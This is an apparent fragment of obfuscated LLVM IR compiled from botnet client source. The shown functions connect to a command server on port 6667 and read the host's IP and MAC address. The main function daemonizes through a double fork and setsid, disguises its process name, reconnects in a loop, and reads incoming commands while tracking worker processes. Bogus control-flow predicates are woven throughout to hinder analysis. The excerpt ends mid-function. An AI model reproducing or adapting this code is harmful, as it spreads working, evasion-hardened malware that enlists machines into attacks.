originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* @currentServer, align 4
  %40 = load i32, i32* @x.75
  %41 = load i32, i32* @y.76
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %51

; <label>:48:                                     ; preds = %26
  %49 = load i32, i32* @currentServer, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* @currentServer, align 4
  br label %51

; <label>:51:                                     ; preds = %48, %originalBBpart24
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %53 = load i32, i32* @currentServer, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %52, i8* %56) #2
  store i32 6667, i32* %3, align 4
  %58 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %59 = call i8* @strchr(i8* %58, i32 58) #10
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %51
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #10
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #10
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #10
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %51
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %69, i32* @mainCommSock, align 4
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %72 = load i32, i32* %3, align 4
  %73 = call i32 @connectTimeout(i32 %70, i8* %71, i32 %72, i32 30)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %92, label %75

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* @x.75
  %77 = load i32, i32* @y.76
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  store i32 1, i32* %1, align 4
  %84 = load i32, i32* @x.75
  %85 = load i32, i32* @y.76
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:92:                                     ; preds = %68
  store i32 0, i32* %1, align 4
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart28
  %94 = load i32, i32* %1, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %7
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* @currentServer, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  store i32 1, i32* %1, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %197

; <label>:16:                                     ; preds = %0
  %17 = load i32, i32* @x.77
  %18 = load i32, i32* @y.78
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0)) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 53) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %2, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  store i32 %34, i32* %4, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, -1
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %1, align 4
  br label %197

; <label>:46:                                     ; preds = %originalBBpart2
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @x.77
  %54 = load i32, i32* @y.78
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 0, i32* %1, align 4
  %61 = load i32, i32* @x.77
  %62 = load i32, i32* @y.78
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %197

; <label>:69:                                     ; preds = %46
  %70 = load i32, i32* @x.77
  %71 = load i32, i32* @y.78
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %69
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %79 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 4
  store i32 %80, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %81 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.62, i32 0, i32 0), i32 0)
  store i32 %81, i32* %7, align 4
  %82 = load i32, i32* @x.77
  %83 = load i32, i32* @y.78
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %90

; <label>:90:                                     ; preds = %127, %originalBBpart28
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %92 = load i32, i32* %7, align 4
  %93 = call i8* @fdgets(i8* %91, i32 4096, i32 %92)
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %129

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %97 = call i8* @strstr(i8* %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i32 0, i32 0)) #10
  %98 = icmp ne i8* %97, null
  br i1 %98, label %99, label %127

; <label>:99:                                     ; preds = %95
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %100, i8** %9, align 8
  br label %101

; <label>:101:                                    ; preds = %originalBBpart212, %99
  %102 = load i8*, i8** %9, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 9
  br i1 %105, label %106, label %125

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* @x.77
  %108 = load i32, i32* @y.78
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = load i8*, i8** %9, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %9, align 8
  %117 = load i32, i32* @x.77
  %118 = load i32, i32* @y.78
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %101

; <label>:125:                                    ; preds = %101
  %126 = load i8*, i8** %9, align 8
  store i8 0, i8* %126, align 1
  br label %129

; <label>:127:                                    ; preds = %95
  %128 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 4096, i32 16, i1 false)
  br label %90

; <label>:129:                                    ; preds = %125, %90
  %130 = load i32, i32* %7, align 4
  %131 = call i32 @close(i32 %130)
  %132 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %133 = load i8, i8* %132, align 16
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %194

; <label>:135:                                    ; preds = %129
  %136 = load i32, i32* @x.77
  %137 = load i32, i32* @y.78
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %135
  %144 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %145 = bitcast %union.anon.6* %144 to [16 x i8]*
  %146 = getelementptr inbounds [16 x i8], [16 x i8]* %145, i32 0, i32 0
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %148 = call i8* @strcpy(i8* %146, i8* %147) #2
  %149 = load i32, i32* %2, align 4
  %150 = call i32 (i32, i64, ...) @ioctl(i32 %149, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  %151 = load i32, i32* @x.77
  %152 = load i32, i32* @y.78
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %159

; <label>:159:                                    ; preds = %190, %originalBBpart216
  %160 = load i32, i32* @x.77
  %161 = load i32, i32* @y.78
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %159
  %168 = load i32, i32* %10, align 4
  %169 = icmp slt i32 %168, 6
  %170 = load i32, i32* @x.77
  %171 = load i32, i32* @y.78
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %169, label %178, label %193

; <label>:178:                                    ; preds = %originalBBpart220
  %179 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %180 = bitcast %union.anon.7* %179 to %struct.sockaddr*
  %181 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %180, i32 0, i32 1
  %182 = getelementptr inbounds [14 x i8], [14 x i8]* %181, i32 0, i32 0
  %183 = load i32, i32* %10, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds i8, i8* %182, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %188
  store i8 %186, i8* %189, align 1
  br label %190

; <label>:190:                                    ; preds = %178
  %191 = load i32, i32* %10, align 4
  %192 = add nsw i32 %191, 1
  store i32 %192, i32* %10, align 4
  br label %159

; <label>:193:                                    ; preds = %originalBBpart220
  br label %194

; <label>:194:                                    ; preds = %193, %129
  %195 = load i32, i32* %2, align 4
  %196 = call i32 @close(i32 %195)
  br label %197

; <label>:197:                                    ; preds = %194, %originalBBpart24, %45, %15
  %198 = load i32, i32* %1, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %16
  %199 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 16, i32 4, i1 false)
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %200, align 4
  %201 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0)) #2
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = call zeroext i16 @htons(i16 zeroext 53) #13
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %204, i16* %205, align 2
  %206 = load i32, i32* %2, align 4
  %207 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %208 = call i32 @connect(i32 %206, %struct.sockaddr* %207, i32 16)
  store i32 %208, i32* %4, align 4
  %209 = load i32, i32* %4, align 4
  %210 = icmp eq i32 %209, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 0, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %69
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  store i32 %213, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %214 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.62, i32 0, i32 0), i32 0)
  store i32 %214, i32* %7, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  %215 = load i8*, i8** %9, align 8
  %216 = getelementptr inbounds i8, i8* %215, i32 1
  store i8* %216, i8** %9, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %135
  %217 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %218 = bitcast %union.anon.6* %217 to [16 x i8]*
  %219 = getelementptr inbounds [16 x i8], [16 x i8]* %218, i32 0, i32 0
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %221 = call i8* @strcpy(i8* %219, i8* %220) #2
  %222 = load i32, i32* %2, align 4
  %223 = call i32 (i32, i64, ...) @ioctl(i32 %222, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %159
  %224 = load i32, i32* %10, align 4
  %225 = icmp slt i32 %224, 6
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %6, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %26, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = ptrtoint i8* %27 to i64
  %29 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %28, i32 0, i32 0, i32 0)
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @getpid() #2
  %32 = xor i32 %30, %31
  call void @srand(i32 %32) #2
  %33 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %34 = call i32 @getpid() #2
  %35 = xor i32 %33, %34
  call void @init_rand(i32 %35)
  %36 = call i32 @getOurIP()
  %37 = call i32 @fork() #2
  store i32 %37, i32* %7, align 4
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %2
  %40 = load i32, i32* %7, align 4
  %41 = call i32 @waitpid(i32 %40, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:42:                                     ; preds = %2
  %43 = load i32, i32* %7, align 4
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %73, label %45

; <label>:45:                                     ; preds = %42
  %46 = call i32 @fork() #2
  store i32 %46, i32* %8, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %45
  call void @exit(i32 0) #14
  unreachable

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %8, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %53, label %52

; <label>:52:                                     ; preds = %49
  br label %55

; <label>:53:                                     ; preds = %49
  %54 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %55

; <label>:55:                                     ; preds = %53, %52
  br label %56

; <label>:56:                                     ; preds = %55
  %57 = load i32, i32* @x.79
  %58 = load i32, i32* @y.80
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %56
  %65 = load i32, i32* @x.79
  %66 = load i32, i32* @y.80
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %91

; <label>:73:                                     ; preds = %42
  %74 = load i32, i32* @x.79
  %75 = load i32, i32* @y.80
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  %82 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  %83 = load i32, i32* @x.79
  %84 = load i32, i32* @y.80
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %91

; <label>:91:                                     ; preds = %originalBBpart24, %originalBBpart2
  %92 = load i32, i32* @x.79
  %93 = load i32, i32* @y.80
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* @x.79
  %101 = load i32, i32* @y.80
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %108

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = call i32 @setsid() #2
  %110 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0)) #2
  %111 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %112

; <label>:112:                                    ; preds = %787, %115, %108
  %113 = call i32 @initConnection()
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %115, label %118

; <label>:115:                                    ; preds = %112
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.67, i32 0, i32 0))
  %117 = call i32 @sleep(i32 5)
  br label %112

; <label>:118:                                    ; preds = %112
  %119 = load i32, i32* @x.79
  %120 = load i32, i32* @y.80
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %118
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %127 = load i32, i32* @x.79
  %128 = load i32, i32* @y.80
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %135

; <label>:135:                                    ; preds = %786, %originalBBpart2120, %originalBBpart271, %originalBBpart259, %originalBBpart212
  %136 = load i32, i32* @mainCommSock, align 4
  %137 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %138 = call i32 @recvLine(i32 %136, i8* %137, i32 4096)
  store i32 %138, i32* %11, align 4
  %139 = icmp ne i32 %138, -1
  br i1 %139, label %140, label %787

; <label>:140:                                    ; preds = %135
  store i32 0, i32* %12, align 4
  br label %141

; <label>:141:                                    ; preds = %292, %140
  %142 = load i32, i32* %12, align 4
  %143 = sext i32 %142 to i64
  %144 = load i64, i64* @numpids, align 8
  %145 = icmp ult i64 %143, %144
  br i1 %145, label %146, label %295

; <label>:146:                                    ; preds = %141
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %12, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i32, i32* %147, i64 %149
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @waitpid(i32 %151, i32* null, i32 1)
  %153 = icmp sgt i32 %152, 0
  br i1 %153, label %154, label %275

; <label>:154:                                    ; preds = %146
  %155 = load i32, i32* @x.79
  %156 = load i32, i32* @y.80
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %14, align 4
  %165 = load i32, i32* @x.79
  %166 = load i32, i32* @y.80
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %173

; <label>:173:                                    ; preds = %205, %originalBBpart216
  %174 = load i32, i32* %14, align 4
  %175 = zext i32 %174 to i64
  %176 = load i64, i64* @numpids, align 8
  %177 = icmp ult i64 %175, %176
  br i1 %177, label %178, label %208

; <label>:178:                                    ; preds = %173
  %179 = load i32, i32* @x.79
  %180 = load i32, i32* @y.80
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i32*, i32** @pids, align 8
  %188 = load i32, i32* %14, align 4
  %189 = zext i32 %188 to i64
  %190 = getelementptr inbounds i32, i32* %187, i64 %189
  %191 = load i32, i32* %190, align 4
  %192 = load i32*, i32** @pids, align 8
  %193 = load i32, i32* %14, align 4
  %194 = sub i32 %193, 1
  %195 = zext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %192, i64 %195
  store i32 %191, i32* %196, align 4
  %197 = load i32, i32* @x.79
  %198 = load i32, i32* @y.80
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart224, label %originalBB18alteredBB

originalBBpart224:                                ; preds = %originalBB18
  br label %205

; <label>:205:                                    ; preds = %originalBBpart224
  %206 = load i32, i32* %14, align 4
  %207 = add i32 %206, 1
  store i32 %207, i32* %14, align 4
  br label %173

; <label>:208:                                    ; preds = %173
  %209 = load i32, i32* @x.79
  %210 = load i32, i32* @y.80
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %208
  %217 = load i32*, i32** @pids, align 8
  %218 = load i32, i32* %14, align 4
  %219 = sub i32 %218, 1
  %220 = zext i32 %219 to i64
  %221 = getelementptr inbounds i32, i32* %217, i64 %220
